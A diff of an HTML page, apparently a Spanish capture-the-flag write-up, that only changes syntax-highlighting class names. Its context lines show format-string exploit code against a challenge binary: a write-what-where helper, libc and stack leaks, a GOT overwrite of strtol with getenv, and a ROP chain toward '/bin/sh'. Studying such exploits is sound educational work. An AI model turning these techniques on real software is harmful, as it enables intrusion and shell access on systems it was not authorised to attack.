@@ -343,7 +343,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 
 <p class="plain-text">Crearemos una función que escriba un <code class="language-plaintext highlighter-rouge">qword</code> en una dirección específica a través de un format string y una primitiva <code class="language-plaintext highlighter-rouge">write-what-where</code>, iniciamos creando un array con <code class="language-plaintext highlighter-rouge">8</code> tuplas que contienen la dirección donde queremos escribir el byte y el <code class="language-plaintext highlighter-rouge">byte</code> que queremos escribir, una vez lo creamos ordenaremos las tuplas usando <code class="language-plaintext highlighter-rouge">sorted</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+<code><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="ra">what</span><span class="p">,</span><span class="ra"> where</span><span class="p">):
     payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 
     array</span><span class="o"> =</span><span class="p"> []
@@ -352,7 +352,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
         array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))  
         what</span><span class="o"> >>= </span><span class="mi">8</span><span class="p">
 
-    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="am">key</span><span class="o">=lambda</span><span class="am"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])</span>
+    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="ra">key</span><span class="o">=lambda</span><span class="ra"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Sabemos que el buffer es de <code class="language-plaintext highlighter-rouge">384</code> bytes y al final enviaremos <code class="language-plaintext highlighter-rouge">8</code> qwords de las direcciones, lo que nos deja un rango de <code class="language-plaintext highlighter-rouge">49</code> posiciones, iniciaremos ahí ya que si fuera la <code class="language-plaintext highlighter-rouge">50</code> usariamos los <code class="language-plaintext highlighter-rouge">384</code> que no nos dejaría espacio para el salto de linea</p>
@@ -399,7 +399,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chall"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
-</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="ra">what</span><span class="p">,</span><span class="ra"> where</span><span class="p">):
     payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 
     array</span><span class="o"> =</span><span class="p"> []
@@ -408,7 +408,7 @@ shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span cla
         array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))
         what</span><span class="o"> >>= </span><span class="mi">8</span><span class="p">
 
-    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="am">key</span><span class="o">=lambda</span><span class="am"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])
+    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="ra">key</span><span class="o">=lambda</span><span class="ra"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])
 
     written </span><span class="o">= </span><span class="mi">0</span><span class="p">
     i</span><span class="o"> =</span><span class="mi"> 49</span><span class="p">
@@ -454,7 +454,7 @@ Program received signal SIGINT, Interrupt.
 
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chall"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
-</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="ra">what</span><span class="p">,</span><span class="ra"> where</span><span class="p">):
     ...................
 
 payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
@@ -519,7 +519,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> | </span><span clas
 
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chall"</span><span class="p">,</span><span class="s"> "b *main+300</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
 
-</span><span class="o">def </span><span class="na">write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+</span><span class="o">def </span><span class="na">write</span><span class="p">(</span><span class="ra">what</span><span class="p">,</span><span class="ra"> where</span><span class="p">):
     ...................
 
 payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
@@ -529,7 +529,7 @@ libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%65$p"</span><span class="p">)
-leak</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)
+leak</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)
 
 log.info(</span><span class="no">f</span><span class="s">"Stack leak:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(leak)}</span><span class="s">"</span><span class="p">)
 
@@ -565,7 +565,7 @@ shell.interactive()</span>
 
 shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chall"</span><span class="p">)
 
-</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="ra">what</span><span class="p">,</span><span class="ra"> where</span><span class="p">):
     payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 
     array</span><span class="o"> =</span><span class="p"> []
@@ -574,7 +574,7 @@ shell</span><span class="o"> =</span><span class="p"> process(</span><span class
         array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))
         what</span><span class="o"> >>= </span><span class="mi">8</span><span class="p">
 
-    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="am">key</span><span class="o">=lambda</span><span class="am"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])
+    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="ra">key</span><span class="o">=lambda</span><span class="ra"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])
 
     written </span><span class="o">= </span><span class="mi">0</span><span class="p">
     i</span><span class="o"> =</span><span class="mi"> 49</span><span class="p">
@@ -600,7 +600,7 @@ libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%65$p"</span><span class="p">)
-rsp</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x110</span><span class="p">
+rsp</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x110</span><span class="p">
 
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x02a3e5</span><span class="p">, rsp</span><span class="o"> +</span><span class="mi"> 0</span><span class="p">)</span><span class="c1">  # pop rdi; ret;</span><span class="p">
 write(libc_base</span><span class="o"> +</span><span class="mi"> 0x1d8678</span><span class="p">, rsp</span><span class="o"> +</span><span class="mi"> 8</span><span class="p">)</span><span class="c1">  # "/bin/sh"</span><span class="p">
